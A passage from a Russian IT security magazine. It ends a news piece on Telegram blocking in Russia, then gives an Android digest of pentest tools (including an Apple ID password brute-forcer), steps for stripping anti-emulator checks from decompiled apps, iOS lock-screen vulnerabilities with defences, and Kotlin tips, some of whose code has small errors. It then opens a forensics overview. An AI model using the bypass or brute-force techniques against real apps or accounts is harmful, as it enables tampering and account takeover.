       суда, на основании которого мог быть совер шен зап рос о пре дос-
      тавле нии клю чей шиф рования. Международ ные стандарты в области
      прав челове ка тре буют наличие юридичес ких гарантий и над зора.
      Блокирование сер виса сообщений Telegram для всех в Рос сии из‑за
      раз бирательства в отношении шес ти отдельных лиц совер шенно явно
      является  исклю чительно  неп ропор циональным  отве том  (влас тей
      РФ)», — говорит Колвилл.

Кроме того, глава международной правоза щитной организации «Агора»
Павел Чиков сооб щил, что в адрес Google, Amazon, Microsoft и Apple было
направле но письмо от лица 13 пра воза щитных организаций из России,
Великобритании, Израиля, США, Ирландии, Канады, Египта, Индии, Колум‐
бии, Аргентины, Венгрии, Кении, ЮАР. Все они осу дили «атаку на интернет
в России» и просят не содействовать в этом российским властям.





Telegram неожиданно поддержал даже Эдвард Сноуден, который ранее кри‐
тиковал мессенджер с  технологической точки зрения. Теперь Сноуден
выразил поддержку позиции Павла Дурова и заявил, что именно так проявля‐
ется настоящее лидерство. Бло кировку миллионов IP‐адресов он называл
«технически невежественной попыткой цензуры».





Свое возмущение «массовыми перебоями в работе множества научных
и образовательных интернет‐ресурсов, поисковых сис тем и серверов элек‐
тронной почты, возникающими из‐за попыток Рос комнадзора заблокировать
мессенджер Telegram» выразил и Совет Межрегионального общества науч‐
ных работников (ОНР).
   Ученые пишут:


      «Из‑за  неп рофес сиональных действий Рос комнад зора  рос сийские
      уче ные были лишены дос тупа к спе циализированной сети науч ных
      контактов ResearchGate, к архивам науч ных жур налов круп нейшего
      изда тельства Wiley, к центральному репозиторию библиотек Java, сай-
       ту жур нала  Science, поис ковой сис теме Google и  к ряду дру гих
      сетевых  сер висов,  пос тоянно  используемых  в  иссле дова тельской
      работе. Перебои в дос тупе к информа ционной сис теме КИАС привели
       к сры ву подачи заявок на конкурсы грантов, проводимые Рос сийским
     фондом фундаментальных иссле дова ний. Из‑за наруше ния дос тупа
       к учебным сайтам был час тично парализован учебный процесс в Скол-
       Техе, МГУ, ВШЭ и ряде дру гих вузов. Пос тра дал так же сайт Вольного
      сетевого  сообщес тва  „Дис сернет“,  разоблачив шего  мас штабные
      некор рек тные заимс твования чужих материалов в дис серта циях мно-
       гих недобросовес тных авторов, в том чис ле гла вы Рос комнад зора А.
       А. Жарова.
       Совет ОНР считает совер шенно недопус тимой прак тику ков ровых
      блокировок любой ценой, без уче та вполне пред ска зуемых негатив ных
      пос ледс твий. Науч ные и обра зова тельные сер висы, дос туп к которым
     был нарушен Рос комнад зором, соблюдали законодательство РФ и не
     были зап рещены судом. Тот вред, который нанес ли действия этого
      ведомс тва рос сийской науке и обра зова нию, а зна чит и все му общес-
       тву, никак не может быть оправдан необходимостью исполне ния
      судебного решения в отношении одной час тной ком пании. Совет ОНР
       так же напоминает, что в соответс твии со статьей 29 Конституции РФ
      каждый име ет пра во свобод но искать, получать, переда вать, произво-
      дить и рас простра нять информа цию любым  законным способом,
      гарантиру ется свобода мас совой информа ции, а цензура зап реща-
       ется. Поиск, ана лиз и обмен науч ной информа цией являются важней-
     шими сос тавляющими науч ной работы.
       Совет  ОНР  тре бует  незамед лительно  пре сечь  вре донос ную
      деятельность Рос комнад зора и обес печить действенную защиту науч-
      ных, обра зова тельных и дру гих социально зна чимых интернет‑ресур-
      сов  от  опас ностей,  исходящих  от  этого  ведомс тва.  Сотрудники
      и руководите ли Рос комнад зора, по вине которых воз никли перебои
      в работе  этих ресур сов на тер ритории Рос сии, должны понес ти
      ответс твенность за свои действия».

Кроме того, генеральный директор разработчика софта Flexbby (резидент
«Скол ково») Андрей Прокофьев предложил интернет‐омбудсме ну Дмитрию
Мариничеву сфор мировать оперативный штаб из представителей власти
и бизнеса для решения проблем компаний, пострадавших от блокировок.
По мнению господина Прокофь ева, нуж ны законодательные поправки, чтобы
исключить ситуации, при которых «жизненно важ ные сервисы российского
бизнеса будут бло кироваться в одностороннем порядке».
  По оценке специалис тов Flexbby, от «веерных блокировок» уже постра‐
дали около 400 российских орга низаций, использующих Google и Amazon.
Наблюдаются сбои в работе хра нилищ данных, бизнес‐приложений, систем
искусственного интеллекта, геоло каций, платежей, взаимодействия с бан‐
ками, обслуживания клиентов и так далее. Компания оце нивает потенциаль‐
ные финансовые потери рос сийского бизнеса почти в миллиард долларов
в случае продолжения бло кировок в ближайшие месяцы.
  Юристы Роскомсвободы тем временем призывают всех российских поль‐
зователей интернета, пос тра давших от «неправомерных действий надзорно‐
го ведомства», написать жалобу в МВД Рос сии. Юристы организации уже
подготовили подробную инс трукцию и шаблоны необ ходимых документов.



      «С  точ ки  зре ния международ ного  пра ва,  это  гру бое наруше ние
      основных принципов, сфор мулированных ООН, при огра ниче нии дос-
      тупа к зап рещенной информа ции. Действия Рос комнад зора по вне-
     сению целых под сетей для того, чтобы заблокировать Telegram, оче-
      вид но неп ропор циональны и наносят сущес твенный эко номичес кий
     ущерб рос сийскому интернет‑биз несу и наруша ют пра ва миллионов
      граждан на свободу информа ции.
        Ру ководс тво техничес кого ведомс тва не могло не знать, к чему
      это все приведет. В действиях выс ших должностных лиц Рос комнад-
      зора могут содер жаться приз наки прес тупле ния или админис тра тив-
      ного пра вона руше ния. Пока пред принима тели готовят иски, мы будем
      тре бовать от МВД и органов прокура туры тща тельной провер ки при-
      нятых решений и наказа ния винов ных. Все пос тра дав шие пользовате-
      ли и пред принима тели име ют пра во защищать свои пра ва и обра-
      щаться с подобными заяв лениями. Это их конституционное пра во
      на  защиту  от  противоп равных  действий  тех  должностных  лиц,
      которые, судя по все му, жела ют полностью раз рушить рос сийский
      интернет», — говорит ведущий юрист Рос ком свободы Сар кис Дар-
      бинян.
HEADER
 ANDROID





ИНСТРУМЕНТЫ ПЕНТЕСТЕРА, УЯЗВИМОСТИ
 ЭКРАНА БЛОКИРОВКИ IOS И МНОЖЕСТВО
        СОВЕТОВ ПО KOTLIN




Сегодня в выпус ке: десять инструментов
пентестера, уязвимости экрана бло кировки
iOS, взлом защиты от запуска приложения
в эмуляторе, способы легально повысить
привилегии в Android, методы усложне ния          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
жизни  взломщика  твоего  приложения,              zobnin@glc.ru
15  инструментов,  которые  наверняка
понадобятся тебе как разработчику, полез‐
ные клавиатурные комбинации Android Stu‐
dio, 31 совет по языку Kotlin и очередная
пачка полезных Android‐библиотек.



ИНСТРУМЕНТЫ

 • SnoopSnitch — приложение для провер ки прошивки телефона на установ‐
   ленные и пропущен ные патчи безопасности;
 • uitkyk — простой скрипт Frida, помогающий обнаружить малварь путем
   анализа хранящихся в стеке объектов и перехвата функций запуска
   шелл‐команд;
 • AndHook — еще один DBI‐фреймворк для Android, подобный Cydia Sub‐
    strate и Xposed;
 • androidre — образ Docker с набором утилит для анализа Android‐приложе‐
   ний: Apktool, jadx, APKiD, Radare2, Frida и дру гие;
 • iCloudBrutter — брутфорсер паролей Apple ID;
 • QARK — инструмент для автоматизированного поиска уязвимос тей мно‐
   гих типов в Android‐приложениях; в некото рых случаях QARK может
   генерировать готовый экспло ит или набор команд ADB для экс плуатации
   уязвимости;
 • droidstatx — утилита, генерирующая май нд мап с информацией о приложе‐
   нии и его возможных уязвимос тях;
 • avd‐root — скрипт для рутинга эмулятора Android;
 • bﬁnject — утилита для внедрения библиотек в любые iOS‐приложения; тре‐
   бует iOS 11.0–11.1.2 с джейлбрейком;
 • bfdecrypt — утилита для дешифровки iOS‐приложений; требует iOS 11.0–
   11.1.2 с джейлбрейком.





                  Карта, сгенерированная droidstatx




ПОЧИТАТЬ


Отключение защиты от запуска в эму лято ре
Bypassing Android Anti‐Emulation, Part (I), Part (II) — серия из двух статей, пос‐
вященных взлому защиты от запус ка в эмуляторе. Первая часть вводная, рас‐
сказывает об устрой стве приложения для Android и о том, как работает сис‐
тема защиты от запуска в эмуляторе. Вторая часть практическая и рас ска‐
зывает, как декомпилировать приложение и отклю чить защиту.
  Интересные моменты:
 • Практически все механизмы защиты от запуска в эмуляторе основаны
   на чтении системных переменных и поиске в них определенных строк.
  Например,  Build.FINGERPRINT.startsWith("generic"),  Build.
  MODEL.contains("google_sdk"),      Build.BRAND.startsWith(
  "generic").
 • Процесс отключения защиты от запуска в эмуляторе в целом почти
   не отличается от про цес са взло ма легитимного приложения. Деком‐
   пилируем приложение с помощью jadx или любого другого декомпилято‐
   ра, находим код проверки на эму лятор (он час то рас полагается в функциях
   с именами типа carrierNameFromTelephonyManager() , isEmulator(
  ) или smellsLikeAnEmulator() ), затем дизассемблируем приложение
   с помощью apktool, находим тот же вызов функции в коде smali и вырезаем
   его. В случае применения ProGuard или дру гого обфускатора это будет
   сделать сложнее (читаемые имена превратят ся в нечто вроде "ab"), но все
  же достаточно легко.



             Пример кода защиты от запуска в эмуляторе




                       Другой пример кода




                   И еще один пример


Уяз вимости экрана бло кировки iOS и спо собы их митигации
http://blog.dinosec.com/2014/09/bypassing‐ios‐lock‐screens.html —  список
всех  уязвимостей  экра на  блокировки  iOS,  найденных  с  версии  iOS
5 по текущую. Список включает в себя ссылки на описание уязвимостей,
а также видеоде монстра ции их экс плуатации.
  Суммарные данные:
 • iOS 5.x — 4 уязвимости;
 • iOS 6.x — 8 уязвимостей;
 • iOS 7.x — 12 уязвимостей;
 • iOS 8.x — 11 уязвимостей;
 • iOS 9.x — 6 уязвимостей;
 • iOS 10.x — 10 уязвимос тей;
 • iOS 11.x — 5 уязвимостей.

Советы, как обезопасить себя от взлома через экран блокировки:
 • отключи Siri на экране бло кировки: Settings → Passcode → Siri (or Voice
    Dial) → Allow access when locked;
 • отключи Passbook на экране блокировки: Settings → Passcode → Passbook
 → Allow access when locked;
 • отключи Control Center на экране бло кировки: Settings → Control Center →
   Access on Lock Screen;
 • отключи панель уведомлений на экране блокировки: Settings → Passcode
 → Allow access when locked;
 • отключи показ пропущенных звонков на экра не блокировки: Settings → No‐
    tiﬁcations → Phone → Show on Lock Screen;
 • отключи показ СМС на экране бло кировки: Settings → Notiﬁcations → Mes‐
   sages → Show Previews;
 • отключи блокировку/разблокировку с помощью чехла: Settings → General
 → Lock/Unlock;
 • отключи камеру на экра не блокировки: Settings → General → Camera;
 • установи цифро‐буквенный пароль.


(Не)безопасность приложе ний, использующих ADB Workaround
Analysing Use of High Privileges in Android Applications — исследование, пос‐
вященное безопасности приложений, использующих так называемый ADB
Workaround для получения более высоких привилегий в системе без root.
   Суть в следующем. В Android, кроме так называ емых normal и dangerous
полномочий, доступных любым приложениям (вторые только с согласия поль‐
зователя), существуют также полномочия уровня system и signature, которые
позволяют приложениям устанавливать и удалять любой софт, делать скрин‐
шоты и скринкасты, бэкап и многие дру гие вещи, зап рещенные обычным при‐
ложениям.
  Полномочия уровня system дос тупны только приложениям, поставляемым
вместе с прошивкой (каталог /system/priv‐app), пол номочия signature —
приложениям, подписанным ключом самой прошивки (то есть тем, который
разработала компания — производитель смартфо на).
  Но есть один трюк, позволяющий получить пол номочия уровня signature
даже приложениям, не подписанным ключом прошивки. Дело в том, что пол‐
номочия signature получает любой процесс, запущенный с помощью команды
adb shell. Некоторые разработ чики пользуются этим трюком и встраивают
в свои приложения специальные прокси, которые затем просят запустить
пользователя с помощью ADB или скрипта. Прокси получает команды от при‐
ложения и выполняет привилегиро ванные операции.
  Иссле дователи проана лизировали код и поведение нескольких приложе‐
ний, использующих этот метод, и выяснили, что они могут представлять серь‐
езную опасность для их пользователей. Несмотря на то что большинство при‐
ложений используют пароль при подклю чении к прокси, обычно этот пароль
либо зашит в само приложение, либо генерируется динамически, но сохраня‐
ется в доступный для чтения файл.
  В теории злоумышленник может создать тро ян, который будет эксплуати‐
ровать эту уязвимость, подключать ся к прокси и с его помощью делать сним‐
ки экрана или записывать скринкасты. И все это без получе ния каких‐либо
прав в системе.





  Процесс обще ния приложения и прокси в приложении FREE screen
  recorder NO ROOT




РАЗРАБОТЧИКУ


Запуск Java-кода с привиле гиями shell
Introducing scrcpy — статья об утилите scrcpy, позволяющей в одну команду
получить на экране ПК картинку с экра на телефона, с возможностью управле‐
ния с помощью мыши и клавиатуры. Однако интерес на статья не этим, а тем,
что рассказывает, как эта утилита работает.
   Чтобы получить картинку с экрана, scrcpy должна загрузить на смартфон
и выпол нить с правами adb shell код, который запус тит процесс скринкастин‐
га экрана и передачи видеопотока на комп. И утилита делает это весьма
интересным образом. Код, запус каемый на смартфоне, написан на Java,
но это не приложение для Android, а просто запакованный в jar файл DEX.
   Разработчик scrcpy объясняет, как сделать такое «неприложение».
 1. Пишем приложение на Java (пример простейший):


   import android.os.SystemClock;
   public class HelloWorld {
       public static void main(String... args) {
           System.out.print("Hello,");
           SystemClock.sleep(1000);
           System.out.println(" world!");
       }
   }

 2. Собираем приложение:


   $ javac ‐source 1.7 ‐target 1.7 \
       ‐cp "$ANDROID_HOME"/platforms/android‐27/android.jar
       HelloWorld.java

 3. Перегоняем его в DEX:


   $ "$ANDROID_HOME"/build‐tools/27.0.2/dx \
       ‐‐dex ‐‐output classes.dex HelloWorld.class

 4. Запаковываем в jar:


   $ jar cvf hello.jar classes.dex

 5. Закидываем на устрой ство и запускаем:


   $ adb push hello.jar /data/local/tmp/
   $ adb shell CLASSPATH=/data/local/tmp/hello.jar app_process /
   HelloWorld

Вуаля, мы получили приложение, которое нет необ ходимости устанавливать
и которое имеет права shell, то есть может выполнять многие привиле гиро‐
ванные действия, недоступные обычным приложениям (signature level permis‐
sion): бэкап, скрин кастинг, сня тие скрин шотов, уста новку и удаление при‐
ложений.


Бо лее луч шая обфускация
Improving ProGuard Name Obfuscation — статья о том, как сделать обфуска‐
цию с помощью ProGuard более запутанной. Утилита ProGuard входит в ком‐
плект Android Studio и представляет собой систему опти мизации Java‐клас‐
сов. Она удаляет неиспользуемый код, а также сокращает име на клас сов,
методов и переменных, делая исполняемый файл меньше. Побочным
эффектом этого является обфускация, когда из‐за изменения имен код ста‐
новится более трудным для понимания.
  По умолчанию ProGuard переименовывает клас сы, методы и поля, исполь‐
зуя английский алфавит: пер вый переименовы вается в a, второй в b, двад‐
цать седьмой — в aa и так далее. Проб лема такого подхода в том, что он
очень предсказуем; взломщику придется разобраться в твоем коде только
один раз, и он легко найдет нужный участок кода в другой версии приложе‐
ния: его имя, скорее всего, будет таким же.
   Эту проблему можно побороть, используя разные словари. В интернете
даже нашелся словарь, содержащий запрещенные для использования в Win‐
dows имена файлов, что дол жно помешать распаковке исполняемого файла
в Windows, но на деле почти не работает. Применяя раз ные словари к каждой
новой версии приложения, можно сделать порядок генерирования имен неп‐
редсказуемым и запутать взломщика.
   Загружается такой сло варь с помощью следующих инструкций в файле
proguard‐rules.pro внут ри проекта:


‐obfuscationdictionary method‐dictionary.txt
‐packageobfuscationdictionary package‐dictionary.txt
‐classobfuscationdictionary class‐dictionary.txt

Также автор рекомендует использовать следующую опцию:


‐repackageclasses 'o'

Она переместит все классы в пакет o, что в теории дол жно еще сильнее
запутать взломщика.


Inline-фун кции Kotlin
Demystifying the inline keyword — статья, посвященная ключевому слову inline,
которое подсказывает компилятору, что вместо вызова функции он дол жен
встраивать ее тело в то мес то, где происходит вызов.
   Inline‐функции появились в  Kotlin по причине избыточности мес тной
реализации лямбд. Каждый раз, ког да вызыва ется функция, которая при‐
нимает лямбду в качестве аргу мента, вир туальной машине приходится соз‐
давать анонимный объект для хранения этой функции. А так как это затратная
в плане ресурсов операция, разработ чики Koltin придумали решение: если
объявить функцию с ключевым сло вом inline, то компилятор «раз вернет» эту
функцию и ее лямбду в пос ледовательный код.
  Правило простое: если твой код множество раз вызывает функцию, при‐
нимающую лямбду в качес тве аргумента, лучше сделать ее inline‐функцией.
Также запомни сле дующие вещи:
 • Kotlin 1.1 позволя ет применять клю чевое слово  inline также к полям,
   в которых используются геттеры и сеттеры;
 • клю чевое слово return, вызванное из лямбды, переданной inline‐функции,
   будет возвращать не из лямбды или inline‐функции, а из функции, выз‐
  вавшей inline‐функцию;
 • кроме клю чевого сло ва inline, также существу ют noinline и crossinline. Пер‐
   вое можно использовать в отношении отдельно взятых лямбд, когда inline‐
  функция принимает нес колько лямбд. Второе при годится в случае, когда
   лямбда должна быть выполнена в дру гом контексте исполнения. Пример:


inline fun exampleFun(crossinline body: () ‐> Unit) {
    Runnable {
        body()
    }.run()
}


15 инстру мен тов, необ ходимых любому Android-раз работчику
15 Android App Development Tools Required for Every Android App Developer —
статья об инструментах, которые пригодятся любому раз работчику:
 • FlowUp — монитор производительности при ложения: FPS, использование
   памяти, процессора и так далее;
 • Stetho — инструмент отладки от раз работчиков Facebook, позволяет
   исследовать иерархию элементов View, базы данных SQLite и сетевые
   операции через Chrome developer tools;
 • LeakCanary — библиотека, сооб щающая об утечках памяти;
 • JRebel — система ускорения сборки приложений;
 • Android Asset Studio — набор инстру ментов для генерации иконок и других
   ресурсов приложения;
 • DryRun — инструмент для быстрого ознакомления с Android‐библиоте‐
   ками (позволяет одной командой запус тить эму лятор с приложением‐при‐
   мером);
 • Vysor — Chrome‐плагин для вза имодействия со смартфоном (выводит
   изображение с экрана и поз воляет нажимать на него);
 • B4A — среда для разработки приложений на BASIC;
 • Genymotion — Android‐эмулятор с массой полезных для разработчика
  функций;
 • Sourcetree — графический клиент Git;
 • Takt — выводит в окно приложения счетчик FPS;
 • Codota — плагин Android Studio для поиска на Stack Overﬂow, GitHub и Gist;
 • AIDE — среда разработки как приложение для Android;
 • Android Studio.


По лез ные клавиатурные комбинации Android Studio
Android Studio Navigation Shortcuts — краткая заметка с полезными клавиатур‐
ными комбинациями.
 • Ctrl + Shift + A (Command + Shift + A) — быстрый поиск действий (элемен‐
   тов меню, таких как Generate signed APK...);
 • Ctrl + N (Command + O) — поиск клас сов;
 • Ctrl + Shift + N (Shift + Command + O) — поиск фай лов;
 • Shift два раза — поиск всего перечисленного выше;
 • Ctrl + Alt + Left (Command + [) — прыжок в предыду щее место кода;
 • Ctlr + Alt + Right (Command + ]) — пры жок в следующее место;
 • Ctrl + E (Command + E) — последние открытые файлы;
 • Ctrl + Shift + Enter (Command + Shift + Enter) — автодопол нение.



                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
           ANDROID
           ИНСТРУМЕНТЫ ПЕНТЕСТЕРА, УЯЗВИМОСТИ
            ЭКРАНА БЛОКИРОВКИ IOS И МНОЖЕСТВО
                           СОВЕТОВ ПО KOTLIN





31 день с Kotlin
Summary of #31DaysOfKotlin. Весь март официальный твиттер‐аккаунт Google,
посвященный разработке приложений для Android (@AndroidDev), публиковал
короткие, но очень полезные заметки о разработке на язы ке Kotlin. Марк Гар‐
сия (Marc Garcia) соб рал их все вместе в одной статье. При вожу максимально
краткую, но понятную выжимку.
 1. Элвис‐оператор (если null, то...):


   val name: String = person.name ?: "unknown"

 2. Строковые шаблоны:


   val text = "$language has ${language.length} characters"

 3. Разрушающие объявления:


   val (red, green, blue) = color
   val (x, y) = point

 4. Оператор when:


   return when (cargo) {
       null, 0 ‐> "empty"
       1 ‐> "tiny"
       2..10 ‐> "small"
       is Int ‐> "big inty"
       else ‐> "$cargo"
   }

 5. Цикл for:


   for(i in 1..100) { /* ... */ }
   for(i in 100 downTo 1) { /* ... */ }
   for(i in 1 until array.size step 2) { /* ... */ }
   for((index, element) in array.withIndex()) { /* ... */ }
   for((key, value) in map) { /* ... */ }

 6. Свойства и поля:


   class User {
       val id: String = "" // Неизменяемое поле
       var name: String = "" // Изменяемое поле
       var surname: String = "" // Изменяемое поле с кастомным
   геттером
           get() = surname.toUpperCase()
       var email: String = "" // Изменяемое поле с кастомным сеттером
           set(value) {
               if(isEmailValid()) field = value
           }
   }

 7. Классы данных (Kotlin автоматичес ки добавляет к ним методы equals(),
    toString() и copy()):


   data class User(val name: String, val email: String /* ... */ )

 8. Модификаторы видимос ти:


   val isVisible = true
   private val isHidden = true
   internal val almostVisible = true

 9. Аргументы по умол чанию:


   class BulletPointSpan(
       private val bulletRadius: Float = DEFAULT_BULLET_RADIUS,
       private val gapWith: Int = DEFAULT_GAP_WIDTH,
       private val color: Int = Color.BLACK
   ) { /* ... */ }
   val bulletPointSpan = BulletPointSpan()
   val bulletPointSpan2 = BulletPointSpan(resources.getDimension(R.
   dimen.radius))
   val bulletPointSpan3 = BulletPointSpan(color = Color.RED)

10. Изолированные клас сы (по сути про качанный enum):


   sealed class NetworkResult
   data class Success(val result: String): NetworkResult()
   data class Failure(val error: Error): NetworkResult()
   viewModel.data.observe(this,
       Observe<NetworkResult> { data ‐>
           data ?: return@Observer
           when (data) {
               is Success ‐> showResult(data.result)
               is Failure ‐> showError(data.error)
           }
   })

 11. Ленивая инициализация (переменная инициализируется в момент пер‐
   вого доступа):


   val preferences: String by lazy { sharedPreferences.getString(
   PREFERENCE_KEY) }

12. Инициализируемые позже не null‐переменные:


   lateinit var recyclerView: RecyclerView
   ...
   recyclerView = findViewById(R.id.recycler_view)

13. Проверка аргументов (выбрасывает IllegalArgumentException, если условие
   не соблюдено):


   require(name.isNotEmpty()) { "Invalid name" }

14. Инлайн‐функции (их тело будет встроено в код вместо вызова):


   inline fun onlyIf(check: Boolean, operator: () ‐> Unit) {
       if (check) { operation() }
   }

15. Вызов функций, объявленных из клас са с помощью Java:


   @file:JvmName("ShapeGenerator")
   package com.shapes
   fun generateSquare() = Square()
   fun generateTriangle() = Triangle()
   // Вызов из Java
   ShapesGenerator.generateSquare()

16. Параметры вещественного типа:


   // Обычно мы делаем так
   val alarmManager = context.getSystemService(AlarmManager::class.
   java)
   // Но можем упростить этот код до такого
   val alarmManager: AlarmManager = context.systemService()
   // Для этого достаточно такой функции
   inline fun <refied T> Context.systemService() = getSystemService(T
   ::class.java)

17. Делегирование  (передача  ответс твенности  за  хранение  состояния
   переменной другому коду):


   class MyAnimationView : View( /* ... */ ) {
     var foregroundX by InvalidateDelegate(0f)
   }
   class InvalidateDelegate<T : Any>(var value: T) {
     operator fun getValue(thisRef: View, property: KProperty<*>) =
   value
     operator fun setValue(thisRef: View, property: KProperty<*>,
   value: T) {
       this.value = value
       thisRef.postInvalidateOnAnimation()
     }
   }

18. Функции расширения (поз воляют добавить свой метод в любой класс):


   inline fun String.toUri(): Uri = Uri.parse(this)
   val myUri = "www.developer.android.com".toUri()

19. Конвертирование Drawable в Bitmap (с помощью библиотеки Android KTX):


   val myDrawable = ContextCompat.getDrawable(context, R.drawable.
   icon)
   val bitmap = myDrawable.toBitmap()

20. Последовательности:


   val sequence = List(50= { it * 5}.asSequence()
   sequence.map    { it * 2 }
           .filter { it % 3 == 0 }
           .map    { it + 1 }
   .toList()

21. Перегрузка операторов:


   inline operator fun Spannable.plusAssign(span: Any) =
           setSpan(span, 0, length, SPAN_INCLUSIVE_EXCLUSIVE)
   val spannable = "Eureka!!!!".toSpannable()
   spannable += StyleSpan(BOLD)
   spannable += UnderlineSpan()

22. Функции без классов:


   @BindingAdapter("userItems")
   fun userItems(recyclerView: RecycleView, list: List<User>?) {
       ...
   }

23. Итераторы библиотеки Android KTX (поз воляют проходить в цикле, нап‐
   ример, по ViewGroup и SparseArray):


   for (view in ViewGroup) { }
   for (key in SparseArray.keyIterator()) { }

24. Упрощенная работа с Content Values с помощью Android KTX:


   val contentValues = contentValuesOf(
       "KEY_INT" to 1,
       "KEY_LONG" to 2L,
       "KEY_BOOLEAN" to true,
       "KEY_NULL" to null
   )

25. DSL (Kotlin позволя ет соз давать «языки в язы ке» для специальных нужд):


   frameLayout {
       button("Light a fire") {
           onClick {
               lightAFire()
           }
       }
   }

26. Упрощенная работа с бандлами с помощью Android KTX:


   val bundle = bundleOf(
       "KEY_INT" to 1,
       "KEY_LONG" to 2L,
       "KEY_BOOLEAN" to true,
       "KEY_NULL" to null,
       "KEY_ARRAY" to arrayOf(1, 2)
   }

27. Лямбды:


   fun Handler.postDelay(delay: Int /* ... */, action: () ‐> Unit)
   handler.postDelay(50) {
       ...
   }

28. Упрощение работы со Spannable с помощью Android KTX:


   val string = buildSpannableString {
       append("no styling text")
       bold {
           append("bold")
           italic { append("bold and italic") }
       }
       inSpans(RelativeSizeSpan(2f), QuoteSpan()) {
           append("double sized quote text")
       }
   }

29. Библиотека Parcelize:


   @Parcelable
   data class User(val name: String, val occupation: Work): Parcel
   able

30. Расширенный Android API с помощью Android KTX:


   view.updatePadding(left = newPadding)
   view.updatePadding(top = newPadding)
   view.updatePadding(right = newPadding)
   view.updatePadding(bottom = newPadding)

31. Функции let, apply, with, also и run:


   val string = "a"
   val result = string.apply {
       // Этот код будет выполнен в контексте объекта string
   }


Инстру мен ты
 • Scrcpy — очень прос тая в использовании ути лита для вывода картинки
   с телефона на комп и взаимо действия с телефоном; требует только ADB
   и не требует root;
 • Hyperion‐Android — инс трумент отладки и подводки интерфейса приложе‐
   ния, по своей сути напоминающий Developer console в браузерах; поз‐
   воляет просматривать и изменять атрибуты, производить замеры эле мен‐
   тов интерфейса, показывать лог при падении приложения, производить
   быструю очистку данных приложения, и все это из скрытого меню в самом
   приложении;
 • Proﬁlo — библиотека для сбо ра данных о производительнос ти приложения
   от Facebook;
 • Сертифицированные устройства — список сертифици рованных Google
   устройств, совместимых с Google Play.



БИБЛИОТЕКИ

 • PhotoEditor — готовый к использованию View с реализацией графического
   редактора в стиле Paint;
 • Lynket — открытый браузер на базе Chrome для тех, кто хочет разобраться,
   как сделать аналог;
 • Json2Kotlin — библиотека для конверта ции JSON в data‐клас сы Kotlin;
 • Kyrie — расширенные классы VectorDrawable и AnimatedVectorDrawable
   с дополнительными функциями;
 • GlideToVectorYou — основанная на Glide биб лиотека для удаленной заг‐
   рузки и показа SVG‐изображений;
 • BottomNavigationViewEx — расширенная версия графичес кого элемента
   BottomNavigationView (меню с кнопками внизу экра на);
 • Spark — библиотека для создания гра диентной ани мации в стиле Insta‐
   gram и Spotify;
 • ShapeOfView — позволяет задать любому View опре деленную форму;
 • ModalBottomSheetDialogFragment — меню внизу экрана в сти ле Material
   Design;
 • Kotlin Please Animate — удоб ная в использовании и мощная библиоте ка
   для анимации элементов интерфейса;
 • ElevationImageView — тень для ImageView;
 • Floating Action Button Speed Dial — меню быс трого доступа по нажатию
    FloatingActionButton (круглая кнопка внизу экрана);
 • android‐inline‐youtube‐view — позволя ет встроить YouTube в приложение;
 • convalida — библиотека валидации полей ввода;
 • LocaleText — позволяет менять локаль при ложения без перезапуска.
COVERSTORY

  ИСКУССТВО
 ФОРЕНЗИКИ





                                       Иван Пискунов



        ТЕОРИЯ, КНИГИ, КУРСЫ,
       ПОЛЕЗНЫЕ МАТЕРИАЛЫ





Если ты когда‐нибудь садился за чужой компьютер, воскли‐
цал «Елки‐палки, да что же тут творилось‐то?!» и пытался
разобраться (а не начисто форматировал винт), то поз драв‐
ляю: ты уже занимался форензикой. Только у специалистов
круг задач намного шире: они рассле дуют инциденты, ана‐
лизируют трафик, ищут сокрытые данные и прочие улики.
Хочешь стать одним из таких спецов? Тогда давай пос‐
мотрим на основы этого мастерства и соберем коллекцию
утилит и ссылок на ресурсы, которые помогут прокачать
скилл.


ФОРЕНЗИКА КАК НАУКА О РАССЛЕДОВАНИИ
КИБЕРПРЕСТУПЛЕНИЙ

Вообще, «форензика» — это калька с английско го слова forensics, которое,
в свою очередь, является сокращенной формой от forensic science, «судеб‐
ная  наука», то есть наука об исследова нии доказательств. В русском
это понятие чаще называют кримина лис тикой, а слово «форензика» зак‐
репилось за компьютерной ее частью.
  Форензика — это удел спецов из групп быс трого реагирования, которые
вклю чаются в работу, если произошел инци дент, например взлом веб‐сер‐
вера или утечка конфиденциальной информа ции, шифрование ценных дан‐
ных и тому подобные проблемы. Перед экспертами‐криминалистами в таком
случае ставятся следующие задачи:
 • понять, как была реализова на ата ка;
 • построить сценарий взлома;
 • восстановить хроноло гию (таймлайн) атаки;
 • собрать артефакты (в смысле, не меч Арма геддона и не святой Грааль,
   а оставшиеся после атаки следы);
 • предложить превентивные защитные меры, чтобы такого впредь не пов‐
   торилось.

Отдельно в этой цепи существует этап фор мирования экспертного зак‐
лючения по факту инцидента ИБ. К примеру, для судебных органов или иных
компетентных в рассле дова нии инцидента структур.
  Сейчас все больше крупных компаний из тех, что имеют свой бренд услуг
ИБ, в обязательном порядке заводят специализированную лабораторию
и штат из нескольких экспертов по форензике. Также форензика часто идет
в составе услуг компаний, которые далеки от сферы ИТ и занимаются, к при‐
меру, финансовым аудитом. Ведь при рас следовании финансового мошен‐
ничества до 100% всех доказательств может содержаться в компьютерных
системах (ERP, CRM, BI, BPM и так далее).
   Ну и конечно, эксперты по форензике — это неотъемле мая  часть
«управления К». Ведь что бы воз будить уго ловное дело по фактам компьютер‐
ных преступле ний, сначала по нормам законодательства необходимо под‐
твердить сам факт прес тупления и определить его состав. Аналогично, если
пострадав шая сторона обра щается в суд за взысканием ущерба, возникше го
из‐за взлома, — тут уже без экспертизы никак не обойтись.
  Отдельная тема — расследова ние целенаправленных атак, или APT. Их
суть сводится к взло му целевых систем с исполь зованием раз нообразных
векторов атак, инструментов, изощренных техник и методов, неиз вестных
до настоящего момента. На эту тему, кста ти, в нашем журнале есть несколько
добротных статей, вот тут с разбором двух кей сов, недавней ис торией
со Сбербанком и небольшой теорией тут и тут.
   Стоит ли говорить, что тас ки на форензику тра диционно присутс твуют и в
CTF? Поэтому без знания хотя бы базовых техник рассле дований не обой‐
тись. Кому интересно, есть примеры разбора тут и вот тут. А некоторые часто
используемые тулзы, идущие в ход на CTF, мы рас смотрим чуть ниже.


КЛАССИФИКАЦИЯ

Лю бая наука склонна делиться на более мелкие темы. Чтобы окончательно
почувствовать себя в институте, давай при кинем карту классификации
нашего предмета.
 • Computer forensics — к ней относится все, что свя зано с поиском арте‐
  фактов взлома на локальной машине: анализ RAM, HDD, реес тра, жур‐
   налов ОС и так далее.
 • Network forensics, как понятно из названия, имеет отношение к рассле‐
